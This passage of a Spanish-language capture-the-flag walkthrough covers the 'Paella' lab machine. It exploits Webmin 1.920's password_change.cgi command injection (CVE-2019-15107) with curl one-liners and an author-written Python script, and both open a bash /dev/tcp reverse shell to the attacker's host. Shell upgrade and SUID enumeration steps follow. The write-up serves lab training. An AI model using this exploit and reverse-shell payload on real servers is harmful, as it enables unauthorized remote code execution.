+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>Tu_IP:4444 -&gt; 192.168.10.50:47850<span style="color:#f92672">)</span> at 2025-05-21 13:51:07 -0600
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>paella
+</span></span><span style="display:flex;"><span>/bin/bash -i
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>516<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>paella@TheHackersLabs-Paella:/usr/share/webmin/acl$
+</span></span></code></pre></div><p>Listo, estamos dentro.</p>
+<h3 id="Exploit">Probando Exploit: Webmin 1.920 - Remote Code Execution</h3>
+<p>Vamos a copiarlo en nuestro directorio de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m linux/webapps/47293.sh
+</span></span><span style="display:flex;"><span>  Exploit: Webmin 1.920 - Remote Code Execution
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/47293
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/linux/webapps/47293.sh
+</span></span><span style="display:flex;"><span>    Codes: CVE-2019-15107
+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: POSIX shell script, ASCII text executable
+</span></span></code></pre></div><p>Analicémoslo.</p>
+<p>Parece que este Exploit, es más un checker que verifica si la máquina/servidor que está usando esta versión de <strong>Webmin</strong> es vulnerable a <strong>Remote Code Execution</strong>.</p>
+<p>En caso de que lo sea, va a mostrar <strong>VULNERABLE</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./47293.sh http://192.168.10.50:10000
+</span></span><span style="display:flex;"><span>Testing <span style="color:#66d9ef">for</span> RCE <span style="color:#f92672">(</span>CVE-2019-15107<span style="color:#f92672">)</span> on http://192.168.10.50:10000: VULNERABLE!
+</span></span></code></pre></div><p>Y sí, parece que sí es vulnerable.</p>
+<p>Lo que podemos hacer ahora es, analizar este Exploit y la versión de <strong>Metasploit</strong>, con tal de ver cómo es que se están ejecutando los comandos.</p>
+<p>Quizá podamos desarrollar nuestro propio Exploit.</p>
+<h3 id="Exploit2">Desarrollando Exploit Remote Code Execution para Webmin 1.920</h3>
+<p>Aquí te dejo los Exploit que se usaron y analizamos:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/47293" target="_blank">Exploit-DB: Webmin 1.920 - Remote Code Execution</a></li>
+<li><a href="https://www.exploit-db.com/exploits/47230" target="_blank">Exploit-DB: Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)</a></li>
+</ul>
+<p>Además, aquí esta la explicación de como se encontro y se Exploto esta vulnerabilidad:</p>
+<ul>
+<li><a href="https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html" target="_blank">DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution</a></li>
+</ul>
+<p>En resumén, la opción <code>user password change</code> permite la vulnerabilidad de ejecución remota de código, ya que, si un usuario necesita cambiar su contraseña expirada, <strong>password_change.cgi</strong> aplica este cambio, revisando la contraseña vieja.</p>
+<p>Pues resulta que el parámetro <code>old=</code> es el que permite esta vulnerabilidad, ya que no realiza ninguna validación de la data enviada, es decir, no revisa si el usuario o la contraseña es correcta.</p>
+<p>Tan solo hay que agregarle una pipe al final del parámetro <code>old=</code> y agregar el comando a ejecutar.</p>
+<p>Podemos comprobarlo con el siguiente one-liner de <strong>curl</strong>, en el que es necesario poner ciertas cabeceras para que funcione (las mismas que ocupan ambos Exploits que ya probamos):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -sk -X POST http://192.168.10.50:10000/password_change.cgi -H <span style="color:#e6db74">&#34;Cookie: redirect=1; testing=1; sid=x; sessiontest=1&#34;</span> -H <span style="color:#e6db74">&#34;Referer: http://192.168.10.50:10000/session_login.cgi&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> --data <span style="color:#e6db74">&#39;user=berserk&amp;pam=&amp;expired=2&amp;old=berserk|id&amp;new1=berserk&amp;new2=berserk&#39;</span> | grep -A2 <span style="color:#e6db74">&#39;&lt;div class=&#34;panel-body&#34;&gt;&#39;</span>
+</span></span></code></pre></div><p>Ve el resultado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;panel-body&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">h3</span>&gt;Failed to change password : The current password is incorrectuid=1000(paella) gid=1000(paella) groups=1000(paella)
+</span></span></code></pre></div><p>Ahí está, parece que funciona.</p>
+<p>Vamos a mandarnos una <strong>traza ICMP</strong> y la capturaremos con <strong>tcpdump</strong>, para saber si es posible una conexión entre la máquina víctima y la nuestra.</p>
+<p>Inicia <strong>tcpdump</strong> para que capture <strong>paquetes ICMP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -i eth0 icmp -n
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on eth0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span></code></pre></div><p>Y mandamos un <strong>ping</strong> desde nuestro one-liner:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -sk -X POST http://192.168.10.50:10000/password_change.cgi -H <span style="color:#e6db74">&#34;Cookie: redirect=1; testing=1; sid=x; sessiontest=1&#34;</span> -H <span style="color:#e6db74">&#34;Referer: http://192.168.10.50:10000/session_login.cgi&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> --data <span style="color:#e6db74">&#39;user=berserk&amp;pam=&amp;expired=2&amp;old=berserk|ping+-c+2+Tu_IP&amp;new1=berserk&amp;new2=berserk&#39;</span> | grep -A2 <span style="color:#e6db74">&#39;&lt;div class=&#34;panel-body&#34;&gt;&#39;</span>
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -i eth0 icmp -n
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on eth0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>19:35:16.374119 IP 192.168.10.50 &gt; Tu_IP: ICMP echo request, id 15431, seq 1, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>19:35:16.374153 IP Tu_IP &gt; 192.168.10.50: ICMP echo reply, id 15431, seq 1, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>19:35:17.375134 IP 192.168.10.50 &gt; Tu_IP: ICMP echo request, id 15431, seq 2, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>19:35:17.375155 IP Tu_IP &gt; 192.168.10.50: ICMP echo reply, id 15431, seq 2, length <span style="color:#ae81ff">64</span>
+</span></span></code></pre></div><p>Funcionó. Entonces, podemos mandarnos una <strong>Reverse Shell</strong> desde nuestro one-liner.</p>
+<h4 id="RevShell">Obteniendo Reverse Shell Manual con one-liner</h4>
+<p>Abre un listener con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Manda la <strong>Reverse Shell</strong> desde el one-liner:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -sk -X POST http://192.168.10.50:10000/password_change.cgi -H <span style="color:#e6db74">&#34;Cookie: redirect=1; testing=1; sid=x; sessiontest=1&#34;</span> -H <span style="color:#e6db74">&#34;Referer: http://192.168.10.50:10000/session_login.cgi&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> --data <span style="color:#e6db74">&#39;user=berserk&amp;pam=&amp;expired=2&amp;old=berserk|bash+-c+&#34;bash+-i+&gt;%26+/dev/tcp/Tu_IP/443+0&gt;%261&#34;&amp;new1=berserk&amp;new2=berserk&#39;</span> | grep -A2 <span style="color:#e6db74">&#39;&lt;div class=&#34;panel-body&#34;&gt;&#39;</span>
+</span></span></code></pre></div><p>Observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.10.50<span style="color:#f92672">]</span> <span style="color:#ae81ff">34584</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>516<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>paella@TheHackersLabs-Paella:/usr/share/webmin/acl$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>paella
+</span></span></code></pre></div><p>Excelente, estamos dentro.</p>
+<p>Ya solamente obtenemos una sesión interactiva, así que ejecuta los siguientes comandos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Paso 1</span>
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 2</span>
+</span></span><span style="display:flex;"><span>CTRL + Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 3</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 4</span>
+</span></span><span style="display:flex;"><span>reset -&gt; xterm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 5</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>export SHELL<span style="color:#f92672">=</span>bash
+</span></span><span style="display:flex;"><span>stty rows <span style="color:#ae81ff">51</span> columns <span style="color:#ae81ff">189</span>
+</span></span></code></pre></div><h4 id="RevShell2">Obteniendo Reverse Shell con Exploit Hecho en Python</h4>
+<p>He desarrollado una forma de automatizar la obtención de la <strong>Reverse Shell</strong> con un script de <strong>Python3</strong>.</p>
+<p>Lo unico que tienes que hacer es:</p>
+<ul>
+<li>Activar un listener con <code>nc -nlvp {puerto_a_usar}</code></li>
+<li>Indicar la URL del webmin, tu IP y el puerto usado del listener</li>
+</ul>
+<p>Aquí te dejo el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> requests.exceptions <span style="color:#f92672">import</span> ReadTimeout
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Desactiva advertencias por SSL</span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>disable_warnings()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Recopilación de argumentos</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_arguments</span>():
+</span></span><span style="display:flex;"><span>        parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Script para aplicar Reverse Shell a Webmin 1.920 vulnerable&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-url&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;URL del Webmin a utilizar, ej: http://10.10.10.10:10000&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-ip&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Tu dirección IP para Reverse Shell&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-p&#34;</span>, type<span style="color:#f92672">=</span>int, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Puerto de escucha a utilizar&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checando si existe password_change.cgi</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_password_change</span>(url_base):
+</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> url_base <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/password_change.cgi&#39;</span>
+</span></span><span style="display:flex;"><span>        headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#34;redirect=1; testing=1; sid=x; sessiontest=1&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url_base<span style="color:#e6db74">}</span><span style="color:#e6db74">/session_login.cgi&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">&#34;[+] El endpoint password_change.cgi está disponible.&#34;</span>)
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">&#34;[-] El endpoint no está disponible o la versión no es vulnerable.&#34;</span>)
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Error al conectar con </span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Explotando vulnerabilidad de RCE para enviar Reverse Shell</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(url_base, ip, port):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[+] Enviando Payload para obtener Reverse Shell&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> url_base <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/password_change.cgi&#39;</span>
+</span></span><span style="display:flex;"><span>        shell <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> 0&gt;&amp;1&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>        encoded_shell <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(shell)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;user=berserk&amp;pam=&amp;expired=2&amp;old=berserk|</span><span style="color:#e6db74">{</span>encoded_shell<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;new1=berserk&amp;new2=berserk&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#34;redirect=1; testing=1; sid=x; sessiontest=1&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{url_base}</span><span style="color:#e6db74">/session_login.cgi&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                requests<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>payload, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;[+] Payload enviado. Si todo está bien, recibirás la reverse shell.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> ReadTimeout:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;[+] Payload enviado. El servidor no respondió (esto es normal si la shell fue exitosa).&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Falló el envío del payload: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>        args <span style="color:#f92672">=</span> parse_arguments()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Asegúrate de tener el listener activo con: nc -lvnp </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>p<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        vulnerable <span style="color:#f92672">=</span> check_password_change(args<span style="color:#f92672">.</span>url)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> vulnerable:
+</span></span><span style="display:flex;"><span>                exploit(args<span style="color:#f92672">.</span>url, args<span style="color:#f92672">.</span>ip, args<span style="color:#f92672">.</span>p)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;[!] Webmin no parece ser vulnerable o no se pudo acceder al endpoint.&#34;</span>)
+</span></span></code></pre></div><p>Hagamos una prueba.</p>
+<p>Abre el listener con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Ejecuta el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 webminExploit.py -url http://192.168.10.50:10000 -ip Tu_IP -p <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Asegúrate de tener el listener activo con: nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> El endpoint password_change.cgi está disponible.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enviando Payload para obtener Reverse Shell
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Payload enviado. El servidor no respondió <span style="color:#f92672">(</span>esto es normal si la shell fue exitosa<span style="color:#f92672">)</span>.
+</span></span></code></pre></div><p>Observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.10.50<span style="color:#f92672">]</span> <span style="color:#ae81ff">43108</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>464<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>paella@TheHackersLabs-Paella:/usr/share/webmin/acl$
+</span></span></code></pre></div><p>Ya solo falta que obtengas una sesión interactiva.</p>
+<p>No olvides buscar la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>paella@TheHackersLabs-Paella:/usr/share/webmin/acl$ cd /home/paella/
+</span></span><span style="display:flex;"><span>paella@TheHackersLabs-Paella:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>paella@TheHackersLabs-Paella:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Continuemos.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="GDB">Enumeración de la Máquina Víctima y Escalando Privilegios con Binario gdb</h3>
+<p>Como tal, no podemos ver los privilegios que tiene nuestro usuario, porque no tenemos su contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>paella@TheHackersLabs-Paella:~$ sudo -l
+</span></span><span style="display:flex;"><span>sudo: unable to resolve host TheHackersLabs-Paella: Name or service not known
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> paella: 
+</span></span><span style="display:flex;"><span>paella@TheHackersLabs-Paella:~$
+</span></span></code></pre></div><p>Podríamos revisar si hay algún binario con <strong>permisos SUID</strong> del que nos podamos aprovechar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>paella@TheHackersLabs-Paella:~$ find / -perm -4000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span>/usr/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/umount
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span></code></pre></div><p>Como tal, no hay alguno que nos sirva.</p>
+<p>Entonces, usaremos <strong>linpeas.sh</strong> para ver si encuentra alguna cosilla por ahí.</p>
+<p>Puedes descargarlo aquí:</p>
+<ul>
